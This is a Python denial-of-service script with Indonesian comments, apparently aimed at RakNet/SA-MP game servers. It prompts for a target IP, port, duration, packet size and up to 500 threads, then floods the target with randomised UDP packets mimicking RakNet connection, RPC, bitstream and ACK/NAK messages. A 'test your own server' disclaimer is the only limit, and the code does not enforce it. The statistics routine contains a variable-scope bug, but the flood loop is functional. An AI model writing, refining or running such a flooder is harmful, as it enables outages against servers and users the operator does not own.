#!/usr/bin/env python3
# QUANTUM_Ω_RAKNET_FLOOD 🔥
# Layer 4 RakNet Flood dengan Input Interaktif
# Made by: R-U 🌌Ω
# ** GUNAKAN UNTUK TEST SERVER SENDIRI! **

import socket
import threading
import time
import sys
import os
import random
import struct
from datetime import datetime

# Warna (opsional, bisa dihapus kalo ga mau pake colorama)
try:
    from colorama import init, Fore, Style
    init()
    COLOR_ENABLED = True
except ImportError:
    COLOR_ENABLED = False
    # Dummy class buat fallback
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = RESET_ALL = ''
    Style = Fore

os.system('cls' if os.name == 'nt' else 'clear')

# ================== BANNER ==================
print(f"""
╔══════════════════════════════════════════════════════════╗
║  QUANTUM_Ω_RAKNET_FLOOD 🌌🔥                               ║
║  Layer 4 RakNet Protocol Flood                            ║
║  ** INTERACTIVE INPUT VERSION **                          ║
║  Made by: R-U 🌌Ω                                          ║
╚══════════════════════════════════════════════════════════╝
""")

# ================== INPUT INTERAKTIF ==================
print("[🌌] Masukkan parameter serangan (test server sendiri ya bro!)")
print("")

# Input IP Address
while True:
    target_ip = input("[Ω] Target IP -> ")
    # Validasi IP sederhana
    parts = target_ip.split('.')
    if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
        break
    else:
        print("[π] IP tidak valid! Masukkan format yang benar (contoh: 192.168.1.1)")

# Input Port
while True:
    try:
        target_port = int(input("[Ω] Target Port -> "))
        if 1 <= target_port <= 65535:
            break
        else:
            print("[π] Port harus antara 1-65535!")
    except ValueError:
        print("[π] Masukkan angka yang valid!")

# Input Durasi (detik)
while True:
    try:
        duration = int(input("[Ω] Durasi (detik) -> "))
        if duration > 0:
            break
        else:
            print("[π] Durasi harus lebih dari 0!")
    except ValueError:
        print("[π] Masukkan angka yang valid!")

# Input Ukuran Packet (bytes)
while True:
    try:
        packet_size = int(input("[Ω] Ukuran Packet (bytes) -> "))
        if packet_size >= 64:
            break
        else:
            print("[π] Ukuran minimal 64 bytes (biar gak ditolak firewall)!")
    except ValueError:
        print("[π] Masukkan angka yang valid!")

# Input Jumlah Thread
while True:
    try:
        threads = int(input("[Ω] Jumlah Thread (1-500) -> "))
        if 1 <= threads <= 500:
            break
        else:
            print("[π] Thread antara 1-500!")
    except ValueError:
        print("[π] Masukkan angka yang valid!")

print("")
print("╔════════════════════════════════════════╗")
print("║         KONFIRMASI SERANGAN            ║")
print("╠════════════════════════════════════════╣")
print(f"║ Target IP  : {target_ip}")
print(f"║ Target Port : {target_port}")
print(f"║ Durasi      : {duration} detik")
print(f"║ Packet Size : {packet_size} bytes")
print(f"║ Thread      : {threads} thread")
print("╚════════════════════════════════════════╝")
print("")

confirm = input("[🔥] Mulai serangan? (y/n) -> ")
if confirm.lower() != 'y':
    print("[❌] Dibatalkan!")
    sys.exit(0)

# ================== RAKNET PACKET GENERATOR ==================
class RakNetPacket:
    """Generate berbagai tipe packet RakNet untuk flood"""
    
    # RakNet Packet IDs
    ID_CONNECTION_REQUEST = 0x09
    ID_CONNECTION_REQUEST_ACCEPTED = 0x10
    ID_NEW_INCOMING_CONNECTION = 0x13
    ID_DISCONNECTION_NOTIFICATION = 0x15
    ID_RPC = 0x82
    ID_RPC_MAPPING = 0x83
    ID_BITSTREAM = 0x87
    ID_USER_PACKET_ENUM = 0x90
    
    @staticmethod
    def generate_connection_request():
        """Packet untuk request koneksi"""
        packet = bytearray()
        packet.append(RakNetPacket.ID_CONNECTION_REQUEST)
        # Random connection data
        packet.extend(struct.pack('<Q', random.getrandbits(64)))  # client guid
        packet.extend(struct.pack('<H', random.randint(1000, 9999)))  # mtu size
        packet.extend(os.urandom(16))  # random data
        return bytes(packet)
    
    @staticmethod
    def generate_rpc_packet():
        """Packet RPC (Remote Procedure Call)"""
        packet = bytearray()
        packet.append(RakNetPacket.ID_RPC)
        # RPC ID random
        packet.append(random.randint(0, 255))
        # RPC data
        packet.extend(struct.pack('<I', random.getrandbits(32)))
        packet.extend(os.urandom(32))
        return bytes(packet)
    
    @staticmethod
    def generate_bitstream():
        """Bitstream packet (biasanya buat data game)"""
        packet = bytearray()
        packet.append(RakNetPacket.ID_BITSTREAM)
        # Bitstream header
        packet.extend(b'SAMP')
        packet.extend(struct.pack('<H', random.randint(1, 1000)))  # bitstream version
        # Random data
        packet.extend(os.urandom(50))
        return bytes(packet)
    
    @staticmethod
    def generate_ack():
        """ACK packet (acknowledgement)"""
        packet = bytearray()
        packet.append(0x80)  # ID_ACK
        packet.extend(struct.pack('<I', random.getrandbits(32)))  # ack number
        packet.extend(struct.pack('<H', random.randint(1, 100)))  # times
        return bytes(packet)
    
    @staticmethod
    def generate_nak():
        """NAK packet (negative acknowledgement)"""
        packet = bytearray()
        packet.append(0xA0)  # ID_NAK
        packet.extend(struct.pack('<I', random.getrandbits(32)))  # nak number
        packet.extend(struct.pack('<H', random.randint(1, 100)))  # times
        return bytes(packet)
    
    @staticmethod
    def generate_custom_packet(size):
        """Generate packet dengan ukuran tertentu"""
        packet_type = random.choice([
            RakNetPacket.generate_connection_request,
            RakNetPacket.generate_rpc_packet,
            RakNetPacket.generate_bitstream,
            RakNetPacket.generate_ack,
            RakNetPacket.generate_nak
        ])
        
        base_packet = packet_type()
        
        # Tambah padding sampai ukuran yang diinginkan
        if len(base_packet) < size:
            padding = os.urandom(size - len(base_packet))
            return base_packet + padding
        else:
            return base_packet[:size]

# ================== STATISTICS ==================
packet_count = 0
bytes_sent = 0
stop_flag = False
stats_lock = threading.Lock()

# ================== FLOOD THREAD ==================
def flood_thread(thread_id):
    global packet_count, bytes_sent, stop_flag
    
    # Buat socket UDP (RakNet pake UDP)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Set timeout biar ga ngeblock
    sock.settimeout(0.1)
    
    # Random source port biar variatif
    try:
        sock.bind(('0.0.0.0', random.randint(1024, 65535)))
    except:
        pass  # Gagal bind ga masalah
    
    start_time = time.time()
    local_count = 0
    
    print(f"[✓] Thread {thread_id} started!")
    
    while not stop_flag and (time.time() - start_time) < duration:
        try:
            # Generate packet
            packet = RakNetPacket.generate_custom_packet(packet_size)
            
            # Send ke target
            sent = sock.sendto(packet, (target_ip, target_port))
            
            # Update stats
            with stats_lock:
                packet_count += 1
                bytes_sent += sent
                local_count += 1
            
            # Random delay kecil biar ga terlalu ngeburst
            time.sleep(0.001)
            
        except socket.error as e:
            # Silent error
            pass
        except Exception as e:
            pass
    
    sock.close()
    print(f"[✓] Thread {thread_id} finished - sent {local_count} packets")

# ================== STATS DISPLAY ==================
def stats_display():
    global stop_flag
    
    start_time = time.time()
    
    while not stop_flag:
        time.sleep(1)
        
        elapsed = time.time() - start_time
        
        with stats_lock:
            current_packets = packet_count
            current_bytes = bytes_sent
        
        # Reset counters
        with stats_lock:
            packet_count = 0
            bytes_sent = 0
        
        # Kalo udah lewat durasi, berhenti
        if elapsed >= duration:
            stop_flag = True
            break
        
        # Tampilkan stats
        mbps = (current_bytes * 8) / 1000000  # Megabits per second
        kpps = current_packets / 1000  # Kilo packets per second
        
        remaining = duration - elapsed
        print(f"[{datetime.now().strftime('%H:%M:%S')}] 📊 Rate: {current_packets} pkt/s | {current_bytes/1024:.2f} KB/s | {mbps:.2f} Mbps | {kpps:.2f} Kpps | Sisa: {remaining:.1f}s")

# ================== MAIN ==================
def main():
    global stop_flag
    
    print("")
    print(f"[🔥] Memulai serangan ke {target_ip}:{target_port} dengan {threads} thread selama {duration} detik")
    print(f"[📦] Ukuran packet: {packet_size} bytes")
    print("")
    
    # Start flood threads
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=flood_thread, args=(i+1,))
        t.daemon = True
        t.start()
        thread_list.append(t)
        time.sleep(0.01)  # Stagger thread start
    
    # Start stats thread
    stats_thread = threading.Thread(target=stats_display)
    stats_thread.daemon = True
    stats_thread.start()
    
    # Wait for duration
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print("\n[!] Dihentikan oleh user!")
        stop_flag = True
    
    # Stop all threads
    stop_flag = True
    
    # Wait for threads to finish
    for t in thread_list:
        t.join(timeout=1)
    
    print("")
    print("╔════════════════════════════════════════╗")
    print("║         SERANGAN SELESAI!              ║")
    print("╚════════════════════════════════════════╝")
    print(f"[✓] Target: {target_ip}:{target_port}")
    print(f"[✓] Durasi: {duration} detik")
    print(f"[✓] Threads: {threads}")
    print(f"[✓] Ukuran packet: {packet_size} bytes")
    print("")
    print("[🌌] QUANTUM_Ω_RAKNET_FLOOD FINISHED 🔥")

if __name__ == "__main__":
    main()
